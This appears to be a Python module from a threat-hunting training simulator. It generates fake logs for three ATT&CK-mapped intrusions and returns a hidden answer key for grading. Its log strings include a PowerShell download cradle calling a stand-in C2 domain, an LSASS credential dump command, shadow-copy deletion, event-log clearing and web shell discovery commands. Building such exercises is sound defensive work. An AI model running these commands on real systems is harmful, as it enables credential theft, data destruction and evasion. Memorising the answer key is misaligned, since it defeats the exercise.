"""The three intrusion scenarios, each a full ATT&CK v20 kill chain.

build_scenario(sid, rng) -> (attack_events, truth)

Truth is the hidden ground truth `sim grade` scores against. Every truth dict
has the same keys so grading is uniform:
  scenario, patient_zero_host, initial_access_time, compromised_accounts,
  c2_ip, c2_domain, attack_techniques, exfil_bytes, summary, timeline.

Every stage timestamp has jittered seconds (never lands on :00), so attack
rows do not stand out by their clock values.

ATT&CK IDs are v20.0 (2026-10-13). Log clearing is T1685.005 in v19+
(the old T1070.001 was removed).
"""
from __future__ import annotations

from datetime import datetime, timedelta

from . import environment as env

_BASE = datetime(2026, 10, 20, 0, 0, 0)
VPN_POOL = "10.20.250."

PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
EXCEL = r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"
CMD = r"C:\Windows\System32\cmd.exe"
NET = r"C:\Windows\System32\net.exe"
W3WP = r"C:\Windows\System32\inetsrv\w3wp.exe"


def _s(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S")


def _clock(rng):
    """Return J(h, m, s=0) -> datetime at h:m:s plus 0-59 jitter seconds."""
    def J(h, m, s=0):
        return _BASE + timedelta(hours=h, minutes=m, seconds=s + rng.randint(0, 59))
    return J


# --------------------------------------------------------------------------
# Scenario 1: phishing -> macro -> PowerShell -> C2 -> cred dump -> SMB lateral
#             -> staging -> HTTPS exfil
# --------------------------------------------------------------------------
def _scenario1(rng):
    J = _clock(rng)
    e = []
    host, user = "WS-07", "f.alharbi"
    ip = env.host_ip(host)
    c2_ip, c2_dom = "185.220.101.47", "cdn-telemetry-sync.net"

    t_mail = J(8, 14)
    t_macro = J(8, 17)
    t_dump = J(8, 55)
    t_lat = J(9, 10)
    t_stage = J(9, 25)
    t_exfil = J(9, 40)

    # T1566.001 spearphishing attachment (look-alike sender domain)
    e.append(dict(time=_s(t_mail), source="email", host=env.MAIL_GW,
                  sender="billing@khobar-loglstics.com", recipient="f.alharbi@khobar.local",
                  subject="Outstanding Invoice #INV-20481 - ACTION REQUIRED",
                  verdict="delivered", attachment="Invoice_Oct.xlsm"))
    # T1204.002 user execution: Excel macro spawns PowerShell (initial access)
    e.append(dict(time=_s(t_macro), source="sysmon", event_id=1, host=host, user=user, Image=PS,
                  ParentImage=EXCEL,
                  CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"))
    # T1059.001 download cradle
    e.append(dict(time=_s(t_macro + timedelta(seconds=40)), source="sysmon", event_id=1, host=host,
                  user=user, Image=PS, ParentImage=PS,
                  CommandLine=f"powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://{c2_dom}/a')"))
    # T1071.001 C2 web beaconing (Sysmon 22 + dns + Sysmon 3 + firewall), 60s with jitter
    t = t_macro + timedelta(minutes=3)
    while t < _BASE + timedelta(hours=9, minutes=30):
        ts = _s(t)
        e.append(dict(time=ts, source="dns", host=host, query_name=c2_dom, query_type="A", answer=c2_ip))
        e.append(dict(time=ts, source="sysmon", event_id=22, host=host, user=user, Image=PS,
                      QueryName=c2_dom, QueryStatus=0, QueryResults=c2_ip))
        e.append(dict(time=ts, source="sysmon", event_id=3, host=host, user=user, Image=PS,
                      DestinationIp=c2_ip, DestinationPort=443, Protocol="tcp"))
        e.append(dict(time=ts, source="firewall", action="allow", src_ip=ip, dest_ip=c2_ip,
                      dest_port=443, proto="tcp"))
        t += timedelta(seconds=60 + rng.randint(-12, 12))
    # T1003.001 LSASS dump via comsvcs MiniDump
    e.append(dict(time=_s(t_dump), source="sysmon", event_id=1, host=host, user=user,
                  Image=r"C:\Windows\System32\rundll32.exe", ParentImage=PS,
                  CommandLine=r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 648 C:\ProgramData\lsass.dmp full"))
    # T1021.002 SMB lateral movement to FS-01 with dumped svc_backup creds
    e.append(dict(time=_s(t_lat), source="sysmon", event_id=3, host=host, user=user, Image=NET,
                  DestinationIp=env.host_ip(env.FILE_SERVER), DestinationPort=445, Protocol="tcp"))
    e.append(dict(time=_s(t_lat + timedelta(seconds=4)), source="security", event_id=4624,
                  host=env.FILE_SERVER, user="svc_backup", TargetUserName="svc_backup",
                  LogonType=3, IpAddress=ip))
    # T1074.001 local staging
    e.append(dict(time=_s(t_stage), source="sysmon", event_id=11, host=host, user=user, Image=PS,
                  TargetFilename=r"C:\ProgramData\staging\khobar_export.7z"))
    # T1567.002 exfil over HTTPS: six POSTs, bytes_out sums to the exfil total
    exfil_total = 0
    for i in range(6):
        chunk = 786432
        exfil_total += chunk
        e.append(dict(time=_s(t_exfil + timedelta(seconds=i * 20 + rng.randint(0, 5))),
                      source="proxy", host=host, user=user, url=f"https://{c2_dom}/upload",
                      method="POST", status_code=200, bytes_out=chunk, bytes_in=128))

    truth = dict(
        scenario=1, patient_zero_host=host, initial_access_time=_s(t_macro),
        compromised_accounts=["f.alharbi", "svc_backup"], c2_ip=c2_ip, c2_domain=c2_dom,
        attack_techniques=["T1566.001", "T1204.002", "T1059.001", "T1071.001",
                           "T1003.001", "T1021.002", "T1074.001", "T1567.002"],
        exfil_bytes=exfil_total,
        summary="Phishing xlsm on WS-07 (f.alharbi) -> macro PowerShell -> HTTPS C2 to "
                "cdn-telemetry-sync.net (185.220.101.47) -> LSASS dump -> SMB lateral to FS-01 "
                "as svc_backup -> staged 7z -> ~4.5 MB exfil over HTTPS.",
        timeline=[
            (_s(t_mail), "Initial Access", "T1566.001", host, "Phishing email with Invoice_Oct.xlsm delivered to f.alharbi"),
            (_s(t_macro), "Execution", "T1204.002 / T1059.001", host, "EXCEL.EXE spawns powershell.exe -enc (macro)"),
            (_s(t_macro + timedelta(minutes=3)), "Command & Control", "T1071.001", host, "60s HTTPS beacon to cdn-telemetry-sync.net / 185.220.101.47:443"),
            (_s(t_dump), "Credential Access", "T1003.001", host, "rundll32 comsvcs.dll MiniDump of lsass -> lsass.dmp"),
            (_s(t_lat), "Lateral Movement", "T1021.002", env.FILE_SERVER, "SMB to FS-01, 4624 LogonType 3 as svc_backup from 10.20.10.7"),
            (_s(t_stage), "Collection", "T1074.001", host, "Staged archive C:\\ProgramData\\staging\\khobar_export.7z"),
            (_s(t_exfil), "Exfiltration", "T1567.002", host, "6x HTTPS POST to C2 /upload, 4,718,592 bytes total"),
        ],
    )
    return e, truth


# --------------------------------------------------------------------------
# Scenario 2: VPN password spray -> valid account -> new Domain Admin ->
#             ransomware precursor (shadow copy delete, mass rename) -> log clear
# --------------------------------------------------------------------------
def _scenario2(rng):
    J = _clock(rng)
    e = []
    victim = "m.otaibi"
    host = env.user_host(victim)  # WS-19
    attacker_ip = "45.133.1.77"
    pool_ip = VPN_POOL + str(rng.randint(10, 60))  # address the VPN hands the session
    new_admin = "svc_helpdesk"

    t_land = J(8, 31)
    t_rdp = J(8, 35)
    t_user = J(8, 50)
    t_group = J(8, 52)
    t_vss = J(9, 30)
    t_enc = J(9, 35)
    t_clear = J(9, 55)

    # T1110.003 password spray against the VPN gateway
    sprayed = [u for u in env.USERNAMES if u != victim]
    rng.shuffle(sprayed)
    t = _BASE + timedelta(hours=8, minutes=5, seconds=rng.randint(0, 59))
    for u in sprayed:
        e.append(dict(time=_s(t), source="vpn", host=env.VPN_GW, user=u, action="fail", src_ip=attacker_ip))
        t += timedelta(seconds=rng.randint(20, 45))
    # T1133 external remote services: spray lands a valid account (initial access)
    e.append(dict(time=_s(t_land), source="vpn", host=env.VPN_GW, user=victim, action="success",
                  src_ip=attacker_ip, assigned_ip=pool_ip))
    e.append(dict(time=_s(t_rdp), source="security", event_id=4624, host=host, user=victim,
                  TargetUserName=victim, LogonType=10, IpAddress=pool_ip))
    # T1136.001 create account
    e.append(dict(time=_s(t_user), source="security", event_id=4720, host="DC-01", user=victim,
                  SubjectUserName=victim, TargetUserName=new_admin))
    # T1098 account manipulation: 4728 member added to security-enabled global group
    e.append(dict(time=_s(t_group), source="security", event_id=4728, host="DC-01", user=victim,
                  SubjectUserName=victim, MemberName=new_admin, TargetUserName="Domain Admins"))
    # T1490 inhibit system recovery
    e.append(dict(time=_s(t_vss), source="sysmon", event_id=1, host=env.FILE_SERVER, user=new_admin,
                  Image=r"C:\Windows\System32\vssadmin.exe", ParentImage=CMD,
                  CommandLine="vssadmin.exe delete shadows /all /quiet"))
    # T1486 simulated as mass renames to .khobarlock
    for i in range(40):
        e.append(dict(time=_s(t_enc + timedelta(seconds=i * 20 + rng.randint(0, 7))), source="sysmon",
                      event_id=11, host=env.FILE_SERVER, user=new_admin, Image=r"C:\ProgramData\enc\run.exe",
                      TargetFilename=rf"E:\Shares\Finance\doc_{i:03d}.xlsx.khobarlock"))
    # T1685.005 clear Windows event logs
    e.append(dict(time=_s(t_clear), source="sysmon", event_id=1, host=env.FILE_SERVER, user=new_admin,
                  Image=r"C:\Windows\System32\wevtutil.exe", ParentImage=CMD,
                  CommandLine="wevtutil.exe cl Security"))
    e.append(dict(time=_s(t_clear + timedelta(seconds=2)), source="security", event_id=1102,
                  host=env.FILE_SERVER, user=new_admin, SubjectUserName=new_admin))

    truth = dict(
        scenario=2, patient_zero_host=host, initial_access_time=_s(t_land),
        compromised_accounts=["m.otaibi", "svc_helpdesk"], c2_ip=None, c2_domain=None,
        attack_techniques=["T1110.003", "T1133", "T1136.001", "T1098", "T1490", "T1486", "T1685.005"],
        exfil_bytes=0,
        summary="VPN password spray from 45.133.1.77 lands m.otaibi -> RDP to WS-19 from the VPN "
                "pool -> creates Domain Admin svc_helpdesk -> deletes shadow copies and mass-renames "
                "Finance shares on FS-01 -> clears the Security log (T1685.005).",
        timeline=[
            (_s(_BASE + timedelta(hours=8, minutes=5)), "Credential Access", "T1110.003", env.VPN_GW, "Password spray from 45.133.1.77 across many VPN users"),
            (_s(t_land), "Initial Access", "T1133", env.VPN_GW, "Spray lands valid account m.otaibi over VPN"),
            (_s(t_rdp), "Initial Access", "T1133", host, f"4624 LogonType 10 (RDP) on WS-19 from VPN pool {pool_ip}"),
            (_s(t_user), "Persistence", "T1136.001", "DC-01", "4720 creates account svc_helpdesk"),
            (_s(t_group), "Privilege Escalation", "T1098", "DC-01", "4728 adds svc_helpdesk to Domain Admins"),
            (_s(t_vss), "Impact", "T1490", env.FILE_SERVER, "vssadmin delete shadows /all /quiet"),
            (_s(t_enc), "Impact", "T1486", env.FILE_SERVER, "Mass rename of Finance shares to .khobarlock"),
            (_s(t_clear), "Defense Impairment", "T1685.005", env.FILE_SERVER, "wevtutil cl Security + 1102 log cleared"),
        ],
    )
    return e, truth


# --------------------------------------------------------------------------
# Scenario 3: web shell -> discovery -> DNS tunnelling
# --------------------------------------------------------------------------
def _scenario3(rng):
    J = _clock(rng)
    e = []
    host, svc = env.WEB_SERVER, "svc_iis"
    attacker_ip = "91.219.236.14"
    tunnel = "dns-sync-khobar.net"

    t_hit = J(8, 40)
    t_exec = J(8, 45)
    t_tun = J(9, 0)

    shell = "/portal/uploads/verify.aspx"
    ua = "python-requests/2.32.3"

    def iis(t, stem, method, query="-", cs_bytes=140, sc_bytes=2048, status=200):
        return dict(time=_s(t), source="iis", host=host, c_ip=attacker_ip, cs_method=method,
                    cs_uri_stem=stem, cs_uri_query=query, s_port=443, sc_status=status,
                    cs_bytes=cs_bytes, sc_bytes=sc_bytes, cs_user_agent=ua)

    # T1190 exploit public-facing app: inbound POST to the upload endpoint (IIS W3C log)
    e.append(dict(time=_s(t_hit), source="firewall", action="allow", src_ip=attacker_ip,
                  dest_ip=env.host_ip(host), dest_port=443, proto="tcp"))
    e.append(iis(t_hit + timedelta(seconds=2), "/portal/upload.aspx", "POST", cs_bytes=4210, sc_bytes=512))
    # T1505.003 web shell written under wwwroot
    e.append(dict(time=_s(t_hit + timedelta(seconds=5)), source="sysmon", event_id=11, host=host,
                  user=svc, Image=W3WP,
                  TargetFilename=r"C:\inetpub\wwwroot\portal\uploads\verify.aspx"))
    # T1059.003 web shell command exec: each request to verify.aspx -> w3wp spawns a shell
    e.append(iis(t_exec - timedelta(seconds=1), shell, "POST", "cmd=whoami+%26+net+user+%26+ipconfig+%2Fall"))
    e.append(dict(time=_s(t_exec), source="sysmon", event_id=1, host=host, user=svc, Image=CMD,
                  ParentImage=W3WP, CommandLine="cmd.exe /c whoami & net user & ipconfig /all"))
    # T1087.002 / T1083 discovery, one inbound request per command
    discovery = [
        ("net+user+%2Fdomain", CMD, "cmd.exe /c net user /domain", NET, "net user /domain"),
        ("net+group+%22Domain+Admins%22+%2Fdomain", CMD, 'cmd.exe /c net group "Domain Admins" /domain',
         NET, 'net group "Domain Admins" /domain'),
        ("whoami+%2Fgroups", CMD, "cmd.exe /c whoami /groups",
         r"C:\Windows\System32\whoami.exe", "whoami /groups"),
        ("dir+%5C%5CFS-01%5CShares", CMD, r"cmd.exe /c dir \\FS-01\Shares", None, None),
    ]
    for i, (query, parent_img, parent_cmd, child_img, child_cmd) in enumerate(discovery):
        t = t_exec + timedelta(seconds=30 + i * 15 + rng.randint(0, 9))
        e.append(iis(t - timedelta(seconds=1), shell, "POST", "cmd=" + query))
        e.append(dict(time=_s(t), source="sysmon", event_id=1, host=host, user=svc, Image=parent_img,
                      ParentImage=W3WP, CommandLine=parent_cmd))
        if child_img:  # dir is a cmd builtin: no child process
            e.append(dict(time=_s(t + timedelta(seconds=1)), source="sysmon", event_id=1, host=host,
                          user=svc, Image=child_img, ParentImage=CMD, CommandLine=child_cmd))
    # T1071.004 DNS tunnelling: many long TXT queries by w3wp, mirrored in the DNS log
    t = t_tun
    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    while t < _BASE + timedelta(hours=10):
        label = "".join(rng.choice(alphabet) for _ in range(rng.randint(30, 50)))
        qname = f"{label}.{tunnel}"
        payload = "".join(rng.choice(alphabet) for _ in range(20))
        ts = _s(t)
        e.append(dict(time=ts, source="sysmon", event_id=22, host=host, user=svc, Image=W3WP,
                      QueryName=qname, QueryStatus=0, QueryResults="type: 16 " + payload))
        e.append(dict(time=ts, source="dns", host=host, query_name=qname, query_type="TXT", answer=payload))
        t += timedelta(seconds=rng.randint(8, 20))

    truth = dict(
        scenario=3, patient_zero_host=host, initial_access_time=_s(t_hit),
        compromised_accounts=["svc_iis"], c2_ip=None, c2_domain=tunnel,
        attack_techniques=["T1190", "T1505.003", "T1059.003", "T1087.002", "T1083", "T1071.004"],
        exfil_bytes=0,
        summary="Web shell uploaded to WEB-01 (verify.aspx) via the portal upload endpoint from "
                "91.219.236.14 -> each POST to verify.aspx makes w3wp.exe spawn cmd.exe as svc_iis "
                "(discovery) -> DNS tunnelling (TXT) to dns-sync-khobar.net.",
        timeline=[
            (_s(t_hit), "Initial Access", "T1190", host, "Inbound POST to /portal/upload.aspx from 91.219.236.14 (source=iis)"),
            (_s(t_hit + timedelta(seconds=5)), "Persistence", "T1505.003", host, "Web shell written: wwwroot\\portal\\uploads\\verify.aspx"),
            (_s(t_exec), "Execution", "T1059.003", host, "POST to verify.aspx -> w3wp.exe spawns cmd.exe /c whoami & net user"),
            (_s(t_exec + timedelta(seconds=30)), "Discovery", "T1087.002 / T1083", host, "net user /domain, net group Domain Admins, dir \\\\FS-01"),
            (_s(t_tun), "Command & Control", "T1071.004", host, "DNS tunnelling: long TXT queries by w3wp.exe to dns-sync-khobar.net"),
        ],
    )
    return e, truth


_SCENARIOS = {1: _scenario1, 2: _scenario2, 3: _scenario3}


def build_scenario(sid: int, rng):
    if sid not in _SCENARIOS:
        raise ValueError(f"unknown scenario {sid}; choose from {sorted(_SCENARIOS)}")
    return _SCENARIOS[sid](rng)
